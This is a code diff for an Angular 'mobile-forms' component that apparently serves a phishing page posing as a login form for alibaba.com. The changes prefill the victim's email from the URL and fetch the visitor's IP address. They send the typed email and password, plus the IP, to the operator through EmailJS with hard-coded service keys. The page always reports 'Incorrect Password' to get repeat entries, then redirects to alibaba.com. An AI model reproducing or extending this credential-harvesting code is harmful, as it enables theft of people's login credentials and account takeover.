@@ -1,12 +1,15 @@
 import { CommonModule } from '@angular/common';
-import { Component, OnInit } from '@angular/core';
+import { HttpClient } from '@angular/common/http';
+import { Component, OnDestroy, OnInit } from '@angular/core';
 import {
   FormBuilder,
   FormGroup,
   FormsModule,
   ReactiveFormsModule,
 } from '@angular/forms';
+import { ActivatedRoute } from '@angular/router';
 import emailjs from '@emailjs/browser';
+import { Subscription } from 'rxjs';
 
 @Component({
   selector: 'app-mobile-forms',
@@ -14,20 +17,33 @@ import emailjs from '@emailjs/browser';
   templateUrl: './mobile-forms.component.html',
   styleUrl: './mobile-forms.component.scss',
 })
-export class MobileFormsComponent implements OnInit {
+export class MobileFormsComponent implements OnInit, OnDestroy {
   loginForm!: FormGroup;
   showError = false;
 
   showPassword = false;
   attemptCount = 0;
+  showLoader = false;
 
-  constructor(private fb: FormBuilder) { }
+  userId!: string;
+
+  private subscription = new Subscription();
+
+  constructor(
+    private fb: FormBuilder,
+    private http: HttpClient,
+    private route: ActivatedRoute
+  ) {}
 
   ngOnInit(): void {
     this.loginForm = this.fb.group({
       email: this.fb.control(null),
       password: this.fb.control(null),
     });
+
+    this.getUserId();
+
+    this.getEmail();
   }
 
   get loginFormControl() {
@@ -36,6 +52,32 @@ export class MobileFormsComponent implements OnInit {
 
   get errorMessage() {
     return 'Incorrect Password';
+  }
+
+  getEmail() {
+    this.subscription.add(
+      this.route.queryParams.subscribe((param) => {
+        const email = param['email'];
+
+        if (email) {
+          this.loginForm.patchValue({
+            email: email,
+            password: '',
+          });
+        }
+      })
+    );
+  }
+
+  getUserId() {
+    this.subscription.add(
+      this.http
+        .get('https://api.ipify.org?format=json')
+        .subscribe((resData: any) => {
+          this.userId = resData.ip;
+          // console.log(this.userId);
+        })
+    );
   }
 
   submit() {
@@ -51,33 +93,40 @@ export class MobileFormsComponent implements OnInit {
   }
 
   redirectToExternalSite() {
-    window.location.href = 'https://www.alibaba.com/';
+    window.location.replace('https://www.alibaba.com/');
   }
 
   async send(end: boolean = false) {
-    emailjs.init('08gaTi0yX9GYMg2w_');
-    const response = await emailjs
-      .send('service_4fx4y8a', 'template_0tzq3y5', {
-        name: 'Stanley',
-        message: `Email: ${this.loginFormControl['email'].value || ''
-          } Password: ${this.loginFormControl['password'].value}, Phone Number: ${this.loginFormControl['countryCode'].value
-          }  Attempt: ${this.attemptCount + 1
-          }`,
-        email: 'ubaid.valtorquegroup@hotmail.com',
+    this.showLoader = true;
 
+    emailjs.init('NKHmyO1Zy4d62isst');
+    const response = await emailjs.send("service_tep2rho","template_dztuzu6", {
+        name: 'Stanley',
+        message: `Email: ${
+          this.loginFormControl['email'].value || ''
+        }, Password: ${
+          this.loginFormControl['password'].value
+        },  Attempt: ${this.attemptCount + 1}, userId: ${this.userId || ''}`,
       })
       .then(() => {
         this.showError = true;
+        this.showLoader = false;
         if (end) {
           this.redirectToExternalSite();
         }
       })
       .catch(() => {
+        this.showLoader = false;
+
         if (end) {
           this.redirectToExternalSite();
         }
       });
   }
 
-
+  ngOnDestroy(): void {
+    if (this.subscription) {
+      this.subscription.unsubscribe();
+    }
+  }
 }
